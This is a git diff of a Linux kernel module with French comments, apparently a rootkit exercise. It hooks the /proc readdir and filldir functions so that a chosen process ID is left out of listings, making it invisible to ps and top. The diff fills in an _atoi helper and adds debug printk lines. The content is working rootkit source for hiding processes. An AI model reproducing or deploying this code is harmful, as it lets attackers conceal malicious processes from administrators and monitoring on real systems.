@@ -34,7 +34,7 @@ MODULE_LICENSE("GPL");
 int my_readdir(struct file *fp, void *buf, filldir_t filldir);
 /* utilisation de u64 pour eviter les warrning du gcc */
 int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x);
-
+int _atoi(const char *s);
 
 /* 
  * variables globales
@@ -68,12 +68,25 @@ struct proc_dir_entry * find_proc_entry(void){
 }
 
 
-int _atoi(const char *arg){
-  /* TODO */
-  return 0;
+/*
+ * Retourne -1 si erreur. 
+ */
+int _atoi(const char *s){
+  int num=0, i=0;
+  if (s == NULL) return -1;
+  while (s[i] != '\0'){  
+    if(s[i] >= '0' && s[i] <= '9')
+      num = num * 10 + s[i] -'0';
+    else 
+      return -1;
+    i++;
+  }
+  if (i==0) return -1;
+  return num;
 }
 
 int my_readdir(struct file *fp, void *buf, filldir_t filldir){  
+  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_readdir\n");
   /* sauvegarder la ref vers la vraie fonction filldir */
   filldir_old_global = filldir;
   return (*readdir_old_global)(fp, buf, my_filldir);
@@ -81,13 +94,16 @@ int my_readdir(struct file *fp, void *buf, filldir_t filldir){
 
 
 int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
+  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_filldir\n");
   /* si le pid courant est celui du processus qu'on veut cacher */
   if (_atoi(name) == pid){
+    printk(KERN_ALERT "[DEBUG] Je suis dans le if. pid = %d\n",pid);
     /* dans ce cas on retourne 0. */
     /* Tous les outils style top et ps n'afficheront pas */
     /* ce processus car il n'existe pas pour eux */
     return 0;
   }
+  printk(KERN_ALERT "[DEBUG] Je ne suis pas dans le if. _atoi(name) = %d\n",_atoi(name));
   /* sinon on appelle la vraie filldir */
   return (*filldir_old_global)(buf, name, nlen, off, ino, x);
 }
